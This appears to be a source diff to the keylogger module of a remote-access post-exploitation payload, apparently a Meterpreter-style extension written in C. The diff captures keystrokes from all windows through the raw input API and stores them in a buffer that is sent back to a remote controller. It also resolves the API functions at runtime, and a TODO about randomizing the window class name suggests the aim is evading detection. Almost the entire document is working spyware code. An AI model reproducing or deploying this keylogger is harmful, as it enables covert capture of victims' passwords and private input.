@@ -1,9 +1,18 @@
-#include "precomp.h"
+/*
+ *	TODO:
+ *	- randomize class name or think of something clever
+ */
 
+#include "precomp.h"
+#include "raw.h"
 #include <tchar.h>
 
 extern HMODULE hookLibrary;
 extern HINSTANCE hAppInstance;
+
+LRESULT CALLBACK ui_keyscan_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
+int ui_log_key(UINT vKey);
+int ui_resolve_raw_api();
 
 /*
  * Enables or disables keyboard input
@@ -44,10 +53,15 @@ bool boom[1024];
 const char g_szClassName[] = "klwClass";
 HANDLE tKeyScan = NULL;
 char *key_scan_buf = NULL;
-unsigned int lenKeyScanBuff = 0;
-int KeyScanSize = 1024*1024;
-int KeyScanIndex = 0;
+int keyscan_size = 1024*1024;
+unsigned int g_ksindex = 0;
 
+/*
+ * function pointers for the raw input api
+ */
+
+f_GetRawInputData fnGetRawInputData;
+f_RegisterRawInputDevices fnRegisterRawInputDevices;
 
 /*
  *  key logger updates begin here
@@ -58,6 +72,16 @@ int WINAPI ui_keyscan_proc()
 WNDCLASSEX klwc;
     HWND hwnd;
     MSG msg;
+    int ret = 0;
+
+    if (fnGetRawInputData == NULL || fnRegisterRawInputDevices == NULL)
+    {
+      ret = ui_resolve_raw_api();
+      if (ret != 1)		 // resolving functions failed
+      {
+        return 0;
+      }
+    }
 
     // register window class
     ZeroMemory(&klwc, sizeof(WNDCLASSEX));
@@ -75,10 +99,9 @@ WNDCLASSEX klwc;
     if(key_scan_buf) {
         free(key_scan_buf);
         key_scan_buf = NULL;
-        KeyScanIndex = 0;
     }
 
-    key_scan_buf = calloc(KeyScanSize, sizeof(char));
+    key_scan_buf = calloc(keyscan_size, sizeof(char));
 
     // create message-only window
     hwnd = CreateWindowEx(
@@ -120,27 +143,32 @@ LRESULT CALLBACK ui_keyscan_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM l
             rid.dwFlags = RIDEV_INPUTSINK;
             rid.hwndTarget = hwnd;
             
-            if(!RegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE)))
+            if(!fnRegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE)))
             {
                 return -1;
             }
             
         case WM_INPUT:
             // request size of the raw input buffer to dwSize
-            GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize,
+            fnGetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize,
                 sizeof(RAWINPUTHEADER));
         
             // allocate buffer for input data
             buffer = (RAWINPUT*)HeapAlloc(GetProcessHeap(), 0, dwSize);
         
-            if(GetRawInputData((HRAWINPUT)lParam, RID_INPUT, buffer, &dwSize,
+            if(fnGetRawInputData((HRAWINPUT)lParam, RID_INPUT, buffer, &dwSize,
                 sizeof(RAWINPUTHEADER)))
             {
                 // if this is keyboard message and WM_KEYDOWN, log the key
                 if(buffer->header.dwType == RIM_TYPEKEYBOARD
                     && buffer->data.keyboard.Message == WM_KEYDOWN)
                 {
-                    if(LogKey(buffer->data.keyboard.VKey) == -1)
+					// reset array index to 0 if its approaching the upper limit
+					if (g_ksindex >= keyscan_size - 32)
+					{
+						g_ksindex = 0;
+					}
+                    if(ui_log_key(buffer->data.keyboard.VKey) == -1)
                         DestroyWindow(hwnd);
                 }
             }
@@ -172,7 +200,7 @@ DWORD request_ui_start_keyscan(Remote *remote, Packet *request)
 	} else {
 		// Make sure we have access to the input desktop
 		if(GetAsyncKeyState(0x0a) == 0) {
-			tKeyScan = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ui_keylog_proc, NULL, 0, NULL);
+			tKeyScan = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ui_keyscan_proc, NULL, 0, NULL);
 		} else {
 			// No permission to read key state from active desktop
 			result = 5;
@@ -191,7 +219,8 @@ DWORD request_ui_stop_keyscan(Remote *remote, Packet *request)
 {
 	Packet *response = packet_create_response(request);
 	DWORD result = ERROR_SUCCESS;
-	
+	g_ksindex = 0;
+
 	if(tKeyScan) {
 		TerminateThread(tKeyScan, 0);
 		tKeyScan = NULL;
@@ -215,8 +244,8 @@ DWORD request_ui_get_keys(Remote *remote, Packet *request)
 	if(tKeyScan) {
 		// This works because NULL defines the end of data (or if its wrapped, the whole buffer)
 		packet_add_tlv_string(response, TLV_TYPE_KEYS_DUMP, key_scan_buf);
-		memset(key_scan_buf, 0, KeyScanSize);
-		KeyScanIndex = 0;
+		memset(key_scan_buf, 0, keyscan_size);
+		g_ksindex = 0;
 	} else {
 		result = 1;
 	}
@@ -228,9 +257,6 @@ DWORD request_ui_get_keys(Remote *remote, Packet *request)
 
 /*
  * log keystrokes
- * DO NOT REMOVE THIS UNTIL YOU ARE FAIRLY CERTAIN POTENTIAL OVERFLOWS ARE DEALT WITH
- * remove text file logging code along with any ref to hLog and simply concatenate 
- * everything into KeyScanBuff
  */
 
 int ui_log_key(UINT vKey)
@@ -238,29 +264,26 @@ int ui_log_key(UINT vKey)
     BYTE lpKeyboard[256];
     char szKey[32];
     WORD wKey;
-    int len;
 
     GetKeyState(VK_CAPITAL); GetKeyState(VK_SCROLL); GetKeyState(VK_NUMLOCK);
     GetKeyboardState(lpKeyboard);
     
-    len = 0;
     switch(vKey)
     {
         case VK_BACK:
-            len += wsprintf(key_scan_buf, "[BP]");
+            g_ksindex += wsprintf(key_scan_buf + g_ksindex, "<^H>");
             break;
         case VK_RETURN:
-            len = 2;
-            strcpy(key_scan_buf, "\r\n");
+            g_ksindex += wsprintf(key_scan_buf + g_ksindex, "<CR>\r\n");
             break;
         case VK_SHIFT:
             break;
         default:
             if(ToAscii(vKey, MapVirtualKey(vKey, 0), lpKeyboard, &wKey, 0) == 1) {
-                len = wsprintf(key_scan_buf, "%c", (char)wKey);
+                g_ksindex += wsprintf(key_scan_buf + g_ksindex, "%c", (char)wKey);
             }
             else if(GetKeyNameText(MAKELONG(0, MapVirtualKey(vKey, 0)), szKey, 32) > 0) {
-                len = wsprintf(key_scan_buf, "[%s]", szKey);
+                g_ksindex += wsprintf(key_scan_buf + g_ksindex, "<%s>", szKey);
             }
             break;
     }
@@ -268,5 +291,31 @@ int ui_log_key(UINT vKey)
 }
 
 /*
- * DO NOT REMOVE THIS UNTIL YOU ARE FAIRLY CERTAIN POTENTIAL OVERFLOWS ARE DEALT WITH
+ * resolve the required functions from the raw input api 
  */
+
+int ui_resolve_raw_api()
+{
+  HINSTANCE hu32 = LoadLibrary("user32.dll");
+
+  if (hu32 == NULL)
+  {
+    return 0;
+  }
+
+  fnGetRawInputData = (f_GetRawInputData)GetProcAddress(hu32, "GetRawInputData");
+  if (fnGetRawInputData == NULL)
+  {
+    FreeLibrary(hu32);
+    return 0;
+  }
+
+  fnRegisterRawInputDevices = (f_RegisterRawInputDevices)GetProcAddress(hu32, "RegisterRawInputDevices");
+  if (fnRegisterRawInputDevices == NULL)
+  {
+    FreeLibrary(hu32);
+    return 0;
+  }
+  
+  return 1;
+}
